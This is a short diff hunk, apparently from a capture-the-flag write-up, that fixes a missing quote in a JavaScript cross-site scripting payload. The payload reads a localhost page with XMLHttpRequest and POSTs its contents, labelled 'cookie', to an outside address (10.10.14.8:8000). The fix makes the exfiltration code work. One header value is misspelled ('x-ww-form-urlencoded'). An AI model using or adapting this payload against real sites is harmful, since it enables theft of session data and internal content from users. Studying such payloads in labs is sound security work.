@@ -31,7 +31,7 @@ req1.open('GET','http://localhost:8000/vac/073ada6c-dcce-4a45-9c8c-da3c30de15f3'
 req1.send();<br/>
 var response = req1.responseText;<br/>
 var params = "cookie=" + encodeURIComponent(response);<br/>
-req2.open('POST', 'http://10.10.14.8:8000/, true);<br/>
+req2.open('POST', 'http://10.10.14.8:8000/', true);<br/>
 req2.setRequestHeader('Content-type', 'application/x-ww-form-urlencoded');<br/>
 req2.send(params);<br/>
 <br/>
